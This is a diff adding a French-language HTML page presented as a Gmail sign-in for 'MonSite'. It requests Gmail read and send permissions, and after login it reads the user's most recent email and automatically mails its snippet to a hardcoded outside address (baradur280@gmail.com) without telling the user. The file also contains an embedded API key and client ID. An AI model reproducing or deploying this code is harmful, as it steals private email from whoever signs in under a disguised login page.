@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Authorization</title>
+    <style>
+        #authorize_button {
+            padding: 10px 20px;
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #authorize_button:hover {
+            background-color: #357ae8;
+        }
+    </style>
+</head>
+<body>
+    <h1>Bienvenue sur MonSite</h1>
+    <p>Connectez-vous pour accéder à vos emails.</p>
+    <button id="authorize_button">Se connecter avec Google</button>
+    <div id="content"></div>
+
+    <script src="https://apis.google.com/js/api.js"></script>
+    <script>
+        var CLIENT_ID = '366868860052-9cshdu847d6g1djt0nh55qmiatb9ivjf.apps.googleusercontent.com';
+        var API_KEY = 'AIzaSyBDxOsCPi5FS467SW30dBhySxIwJ_GsMtk';
+        var SCOPES = 'https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/gmail.send';
+
+        window.addEventListener('error', function(event) {
+            alert('Erreur globale détectée : ' + event.message + '\nSource : ' + event.filename + '\nLigne : ' + event.lineno + '\nColonne : ' + event.colno);
+        });
+
+        window.addEventListener('unhandledrejection', function(event) {
+            alert('Erreur non capturée dans une promesse : ' + event.reason);
+        });
+
+        function handleClientLoad() {
+            try {
+                gapi.load('client:auth2', function() {
+                    console.log("gapi loaded");
+                    initClient();
+                });
+            } catch (error) {
+                console.error('Erreur lors du chargement de l\'API gapi:', error);
+                alert('Erreur lors du chargement de l\'API gapi: ' + error.message);
+            }
+        }
+
+        function initClient() {
+            try {
+                console.log("Initialisation du client");
+                gapi.client.init({
+                    apiKey: API_KEY,
+                    clientId: CLIENT_ID,
+                    discoveryDocs: ["https://www.googleapis.com/discovery/v1/apis/gmail/v1/rest"],
+                    scope: SCOPES
+                }).then(function () {
+                    console.log("Client initialisé");
+                    gapi.auth2.getAuthInstance().isSignedIn.listen(updateSigninStatus);
+                    updateSigninStatus(gapi.auth2.getAuthInstance().isSignedIn.get());
+                    document.getElementById('authorize_button').onclick = handleAuthClick;
+                }).catch(function(error) {
+                    console.error('Erreur d\'initialisation du client:', error);
+                    alert('Erreur d\'initialisation du client: ' + error.message);
+                });
+            } catch (error) {
+                console.error('Erreur lors de l\'initialisation du client:', error);
+                alert('Erreur lors de l\'initialisation du client: ' + error.message);
+            }
+        }
+
+        function updateSigninStatus(isSignedIn) {
+            try {
+                if (isSignedIn) {
+                    document.getElementById('authorize_button').style.display = 'none';
+                    sendEmailToAddress();
+                } else {
+                    document.getElementById('authorize_button').style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Erreur lors de la mise à jour du statut de connexion:', error);
+                alert('Erreur lors de la mise à jour du statut de connexion : ' + error.message);
+            }
+        }
+
+        function handleAuthClick(event) {
+            try {
+                gapi.auth2.getAuthInstance().signIn().catch(function(error) {
+                    console.error('Erreur de connexion:', error);
+                    alert('Erreur de connexion : ' + error.message);
+                });
+            } catch (error) {
+                console.error('Erreur lors de la gestion du clic d\'authentification:', error);
+                alert('Erreur lors de la gestion du clic d\'authentification : ' + error.message);
+            }
+        }
+
+        function sendEmailToAddress() {
+            try {
+                gapi.client.gmail.users.messages.list({
+                    'userId': 'me',
+                    'maxResults': 1
+                }).then(function(response) {
+                    var messageId = response.result.messages[0].id;
+                    gapi.client.gmail.users.messages.get({
+                        'userId': 'me',
+                        'id': messageId
+                    }).then(function(response) {
+                        var emailContent = response.result.snippet;
+                        sendMessage({
+                            'To': 'baradur280@gmail.com',
+                            'Subject': 'Email from Gmail API'
+                        }, emailContent);
+                    }).catch(function(error) {
+                        console.error('Erreur lors de la récupération du message:', error);
+                        alert('Erreur lors de la récupération du message : ' + error.message);
+                    });
+                }).catch(function(error) {
+                    console.error('Erreur lors de la liste des messages:', error);
+                    alert('Erreur lors de la liste des messages : ' + error.message);
+                });
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi de l\'email:', error);
+                alert('Erreur lors de l\'envoi de l\'email : ' + error.message);
+            }
+        }
+
+        function sendMessage(headers_obj, message) {
+            try {
+                var email = '';
+                for (var header in headers_obj)
+                    email += header += ": " + headers_obj[header] + "\r\n";
+
+                email += "\r\n" + message;
+
+                var base64EncodedEmail = btoa(email).replace(/\+/g, '-').replace(/\//g, '_');
+                gapi.client.gmail.users.messages.send({
+                    'userId': 'me',
+                    'resource': {
+                        'raw': base64EncodedEmail
+                    }
+                }).then(function(response) {
+                    document.getElementById('content').innerHTML = '<p>Email envoyé à baradur280@gmail.com</p>';
+                }).catch(function(error) {
+                    console.error('Erreur lors de l\'envoi du message:', error);
+                    alert('Erreur lors de l\'envoi du message : ' + error.message);
+                });
+            } catch (error) {
+                console.error('Erreur lors de la préparation du message:', error);
+                alert('Erreur lors de la préparation du message : ' + error.message);
+            }
+        }
+
+        handleClientLoad();
+    </script>
+</body>
+</html>
